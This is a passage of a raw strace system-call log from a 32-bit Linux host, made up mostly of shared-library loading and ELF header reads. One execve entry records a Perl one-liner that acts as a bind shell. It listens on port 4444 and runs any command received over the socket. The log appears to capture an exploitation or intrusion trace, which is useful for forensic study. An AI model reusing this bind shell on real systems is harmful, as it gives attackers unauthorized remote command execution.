\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
8461  07:23:33.076050 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
8461  07:23:33.076067 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc6000
8461  07:23:33.076078 mmap2(0xb7dcd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7dcd000
8461  07:23:33.076094 close(1)          = 0
8461  07:23:33.076105 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.076118 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
8461  07:23:33.076132 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
8461  07:23:33.076259 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
8461  07:23:33.076278 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dae000
8461  07:23:33.076326 mmap2(0xb7dc2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dc2000
8461  07:23:33.076361 mmap2(0xb7dc4000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dc4000
8461  07:23:33.076410 close(1)          = 0
8461  07:23:33.076489 munmap(0xb7f54000, 29913) = 0
8461  07:23:33.076542 open("/etc/ld.so.cache", O_RDONLY) = 1
8461  07:23:33.076574 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8461  07:23:33.076626 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f54000
8461  07:23:33.076653 close(1)          = 0
8461  07:23:33.076682 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.076745 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
8461  07:23:33.076761 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8461  07:23:33.076883 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
8461  07:23:33.076900 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7da4000
8461  07:23:33.076911 mmap2(0xb7dac000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dac000
8461  07:23:33.076928 close(1)          = 0
8461  07:23:33.076940 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.076953 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
8461  07:23:33.076967 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8461  07:23:33.077053 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8461  07:23:33.077070 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d99000
8461  07:23:33.077080 mmap2(0xb7da2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7da2000
8461  07:23:33.077096 close(1)          = 0
8461  07:23:33.077120 munmap(0xb7f54000, 29913) = 0
8461  07:23:33.077137 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
8461  07:23:33.077151 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8461  07:23:33.077162 _llseek(1, 0, [0], SEEK_CUR) = 0
8461  07:23:33.077174 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
8461  07:23:33.077200 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f5b000
8461  07:23:33.077240 _llseek(1, 1624, [1624], SEEK_SET) = 0
8461  07:23:33.077256 munmap(0xb7f5b000, 1624) = 0
8461  07:23:33.077281 close(1)          = 0
8461  07:23:33.077325 getpgrp()         = 3831
8461  07:23:33.077336 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
8461  07:23:33.077364 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
8461  07:23:33.077380 brk(0x8101000)    = 0x8101000
8461  07:23:33.077411 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8461  07:23:33.077426 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8461  07:23:33.077440 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8461  07:23:33.077477 brk(0x8102000)    = 0x8102000
8461  07:23:33.077503 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8461  07:23:33.077521 stat64("/sbin/AB", 0xbfcedb48) = -1 ENOENT (No such file or directory)
8461  07:23:33.077533 stat64("/bin/AB", 0xbfcedb48) = -1 ENOENT (No such file or directory)
8461  07:23:33.077545 stat64("/usr/sbin/AB", 0xbfcedb48) = -1 ENOENT (No such file or directory)
8461  07:23:33.077556 stat64("/usr/bin/AB", 0xbfcedb48) = -1 ENOENT (No such file or directory)
8461  07:23:33.077569 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8461  07:23:33.077584 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcf6f8) = 8462
8462  07:23:33.077642 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8462  07:23:33.077658 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8462  07:23:33.077671 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8462  07:23:33.077683 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8462  07:23:33.077732 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8462  07:23:33.077766 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8462  07:23:33.077792 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8462  07:23:33.077848 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
8462  07:23:33.077862 --- SIGPIPE (Broken pipe) @ 0 (0) ---
8462  07:23:33.077933 exit_group(127)   = ?
8461  07:23:33.103791 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:23:33.103845 waitpid(8461,  <unfinished ...>
8461  07:23:33.103856 <... rt_sigprocmask resumed> NULL, 8) = 0
8461  07:23:33.103864 --- SIGCHLD (Child exited) @ 0 (0) ---
8461  07:23:33.103879 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 8462
8461  07:23:33.103898 waitpid(-1, 0xbfced7c8, WNOHANG) = -1 ECHILD (No child processes)
8461  07:23:33.103923 sigreturn()       = ? (mask now [])
8461  07:23:33.103960 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8461  07:23:33.103989 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8461  07:23:33.104000 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8461  07:23:33.104013 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8461  07:23:33.104032 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8461  07:23:33.104058 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8461  07:23:33.104122 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8461  07:23:33.104157 stat64("/sbin/perl", 0xbfcedb78) = -1 ENOENT (No such file or directory)
8461  07:23:33.104287 stat64("/bin/perl", 0xbfcedb78) = -1 ENOENT (No such file or directory)
8461  07:23:33.104331 stat64("/usr/sbin/perl", 0xbfcedb78) = -1 ENOENT (No such file or directory)
8461  07:23:33.104343 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8461  07:23:33.104361 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8461  07:23:33.104402 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8461  07:23:33.104433 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcf6f8) = 8463
8463  07:23:33.104491 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8463  07:23:33.104507 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8463  07:23:33.104520 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8463  07:23:33.104531 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8463  07:23:33.104546 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8463  07:23:33.104561 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8463  07:23:33.104573 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8463  07:23:33.104608 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
8463  07:23:33.104695 brk(0)            = 0x8153000
8463  07:23:33.104720 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.104736 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f63000
8463  07:23:33.104751 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.104799 open("/etc/ld.so.cache", O_RDONLY) = 1
8463  07:23:33.104812 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8463  07:23:33.104846 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f5b000
8463  07:23:33.104857 close(1)          = 0
8463  07:23:33.104867 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.104882 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8463  07:23:33.104896 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8463  07:23:33.104985 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8463  07:23:33.105003 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f57000
8463  07:23:33.105014 mmap2(0xb7f59000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f59000
8463  07:23:33.105030 close(1)          = 0
8463  07:23:33.105041 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.105056 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
8463  07:23:33.105069 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
8463  07:23:33.105158 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
8463  07:23:33.105175 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f32000
8463  07:23:33.105186 mmap2(0xb7f55000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f55000
8463  07:23:33.105201 close(1)          = 0
8463  07:23:33.105212 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.105226 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
8463  07:23:33.105240 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
8463  07:23:33.105369 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
8463  07:23:33.105387 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f31000
8463  07:23:33.105399 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f19000
8463  07:23:33.105410 mmap2(0xb7f2d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f2d000
8463  07:23:33.105424 mmap2(0xb7f2f000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f2f000
8463  07:23:33.105437 close(1)          = 0
8463  07:23:33.105449 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.105462 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8463  07:23:33.105475 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8463  07:23:33.105562 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8463  07:23:33.105582 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dca000
8463  07:23:33.105593 mmap2(0xb7f13000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f13000
8463  07:23:33.105607 mmap2(0xb7f16000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f16000
8463  07:23:33.105620 close(1)          = 0
8463  07:23:33.105632 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8463  07:23:33.105645 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
8463  07:23:33.105659 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 